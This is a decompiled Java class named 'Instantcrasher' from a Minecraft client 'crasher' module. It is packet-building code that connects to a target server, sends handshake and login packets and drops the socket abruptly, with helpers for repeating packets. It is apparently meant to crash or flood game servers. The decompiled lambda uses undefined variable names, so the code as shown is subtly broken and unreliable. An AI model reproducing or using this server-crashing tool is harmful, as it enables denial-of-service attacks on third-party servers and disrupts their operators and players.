// 
// Decompiled by Procyon v0.6.0
// 

package me.amkgre.bettercraft.client.mods.crasher.ic;

import java.io.OutputStream;
import java.io.ByteArrayOutputStream;
import java.nio.charset.StandardCharsets;
import java.io.DataInputStream;
import java.io.IOException;
import java.io.DataOutputStream;
import java.net.Socket;

public class Instantcrasher
{
    public static void crash(final String ip, final int port, final String playerName, final int protocol) {
        new Thread(() -> {
            try {
                final Socket e = new Socket(ip2, port2);
                e.setTcpNoDelay(true);
                final DataOutputStream output = new DataOutputStream(e.getOutputStream());
                writePacket(createHandshakePacket(ip2, port2, protocol2), output);
                writePacket(createLoginPacket(playerName2), output);
                e.setSoLinger(true, 0);
                e.close();
            }
            catch (final Exception ex) {}
        }).start();
    }
    
    public static void writeByteArray(final DataOutputStream out, final byte[] data) throws IOException {
        writeVarInt(out, data.length);
        out.write(data, 0, data.length);
    }
    
    public static void writePingPacket(final DataOutputStream out, final long clientTime) throws IOException {
        writeVarInt(out, 1);
        out.writeLong(clientTime);
    }
    
    public static int readVarInt(final DataInputStream in) throws IOException {
        int i = 0;
        int j = 0;
        byte k;
        do {
            k = in.readByte();
            i |= (k & 0x7F) << j++ * 7;
            if (j <= 5) {
                continue;
            }
            throw new RuntimeException("int too big :3");
        } while ((k & 0x80) == 0x80);
        return i;
    }
    
    public static void writeHandshakePacket(final DataOutputStream out, final String ip, final int port, final int protocol, final int state) throws IOException {
        writeVarInt(out, 0);
        writeVarInt(out, protocol);
        writeString(out, ip);
        out.writeShort(port);
        writeVarInt(out, state);
    }
    
    public static void writeQueryRequestPacket(final DataOutputStream out) throws IOException {
        writeVarInt(out, 0);
    }
    
    public static void writePacket(final byte[] packetData, final DataOutputStream out) throws IOException {
        writeVarInt(out, packetData.length);
        out.write(packetData);
    }
    
    public static String readServerDataPacket(final DataInputStream in) throws IOException {
        final byte id = in.readByte();
        return (id != 0) ? null : readString(in);
    }
    
    public static void writeStringC(final DataOutputStream out, final String value) throws IOException {
        final byte[] data = value.getBytes(StandardCharsets.UTF_8);
        final byte[] after = new byte[data.length];
        for (int i = 0; i < data.length; ++i) {
            after[i] = data[i];
        }
        writeVarInt(out, after.length);
        out.write(after, 0, after.length);
    }
    
    public static void writePacketSomeTimes(final byte[] packetData, final DataOutputStream out, final int times) throws IOException {
        ByteArrayOutputStream LoginOutPutStream = null;
        LoginOutPutStream = new ByteArrayOutputStream();
        final DataOutputStream login = new DataOutputStream(LoginOutPutStream);
        writeVarInt(login, packetData.length);
        login.write(packetData);
        final byte[] bytes = LoginOutPutStream.toByteArray();
        for (int i = 0; i < times; ++i) {
            out.write(bytes);
        }
    }
    
    private static byte[] createHandshakePacket(final String ip, final int port, final int protocol) throws IOException {
        final ByteArrayOutputStream bytes = new ByteArrayOutputStream();
        final DataOutputStream out = new DataOutputStream(bytes);
        writeHandshakePacket(out, ip, port, protocol, 2);
        final byte[] data = bytes.toByteArray();
        bytes.close();
        return data;
    }
    
    public static void writeVarInt(final DataOutputStream out, int value) throws IOException {
        while ((value & 0xFFFFFF80) != 0x0) {
            out.writeByte((value & 0x7F) | 0x80);
            value >>>= 7;
        }
        out.writeByte(value);
    }
    
    public static void writeString(final DataOutputStream out, final String value) throws IOException {
        final byte[] data = value.getBytes(StandardCharsets.UTF_8);
        final byte[] after = new byte[data.length];
        writeVarInt(out, data.length);
        out.write(data, 0, data.length);
    }
    
    private static byte[] createLoginPacket(final String playerName) throws IOException {
        final ByteArrayOutputStream bytes = new ByteArrayOutputStream();
        final DataOutputStream out = new DataOutputStream(bytes);
        writeVarInt(out, 0);
        writeString(out, s(playerName));
        final byte[] data = bytes.toByteArray();
        bytes.close();
        return data;
    }
    
    private static String s(final String s) {
        return (s.length() > 16) ? s.substring(0, 16) : s;
    }
    
    public static long readPongPacket(final DataInputStream in) throws IOException {
        final byte id = in.readByte();
        return (id != 1) ? -1L : in.readLong();
    }
    
    public static byte[] readByteArray(final DataInputStream in) throws IOException {
        final int len = readVarInt(in);
        final byte[] data = new byte[len];
        in.readFully(data);
        return data;
    }
    
    public static String readString(final DataInputStream in) throws IOException {
        final int len = readVarInt(in);
        final byte[] data = new byte[len];
        in.readFully(data);
        return new String(data, 0, len, StandardCharsets.UTF_8);
    }
}
